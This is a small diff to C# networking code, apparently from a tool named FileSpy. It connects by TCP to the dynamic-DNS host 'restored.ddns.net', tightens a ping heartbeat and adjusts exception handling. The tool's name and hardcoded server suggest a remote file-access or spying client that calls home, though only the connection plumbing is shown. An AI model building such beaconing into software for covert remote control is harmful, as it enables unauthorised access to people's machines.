@@ -49,6 +49,7 @@ namespace FileSpy.Classes
                     {
                         Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                         Client.Connect("restored.ddns.net", 6000);
+                        //Client.Connect(IPAddress.Parse("192.168.1.65"), 6000);
                         Connected = true;
                         LastTime = DateTime.Now;
                         Task.Run(Pulsar);
@@ -65,7 +66,7 @@ namespace FileSpy.Classes
         {
             while (Connected)
             {
-                if ((DateTime.Now - LastTime).TotalSeconds > 5)
+                if ((DateTime.Now - LastTime).TotalSeconds > 2)
                 {
                     SendMessage(new MessageClass(ID, -1, Commands.Ping, 0));
                 }
@@ -108,8 +109,9 @@ namespace FileSpy.Classes
                 Client.Send(buffer);
                 LastTime = DateTime.Now;
             }
-            catch
+            catch (Exception e)
             {
+                string a = e.Message;
                 Disconnect();
             }
         }
